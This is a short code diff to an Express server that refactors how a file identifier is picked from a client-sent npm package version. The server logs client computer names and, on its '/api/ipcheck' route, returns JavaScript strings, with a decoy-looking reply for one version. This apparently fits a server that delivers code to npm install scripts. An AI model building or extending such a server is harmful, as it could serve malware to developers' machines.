@@ -40,13 +40,20 @@ const limiter = rateLimit({
   skip: (req) => req.headers["x-secret-header"] === SECRET_HEADER_VALUE,
 });
 
-function l2(rBody) {
-  const input = rBody.npm_package_version || "03";
+function getLastPart(rBody) {
+  const input = rBody.npm_package_version || "3";
   try {
-      return (typeof input !== 'string' || input.length < 2) ? "03" : input.slice(-2);
+      // Check if the input is a string
+      if (typeof input !== 'string') return "3";
+      
+      // Split the string by "."
+      const parts = input.split('.');
+      
+      // Return the last part if available, otherwise return "3"
+      return parts.length > 0 ? parts[parts.length - 1] : "3";
   } catch (error) {
       // Handle the error appropriately
-      return "03";
+      return "3";
   }
 }
 
@@ -120,7 +127,7 @@ app.use(async (req, res, next) => {
           logData.computername = req.body.COMPUTERNAME;
           
           const requestedFile = req.params.filename;
-          const fileName = requestedFile == "703" ? "03" : l2(req.body);
+          const fileName = requestedFile == "703" ? "3" : getLastPart(req.body);
           logData.flag = fileName;
       }
 
@@ -173,9 +180,9 @@ app.post("/api/ipcheck/:filename", (req, res) => {
   try {
     
     const requestedFile = req.params.filename;
-    const fileName = requestedFile == "703" ? "03" : l2(req.body);
+    const fileName = requestedFile == "703" ? "3" : getLastPart(req.body);
 
-    if(l2(req.body) == "v1" ){
+    if(getLastPart(req.body) == "v1" ){
       res.json('console.log("Development server started...")');
       }
     else{
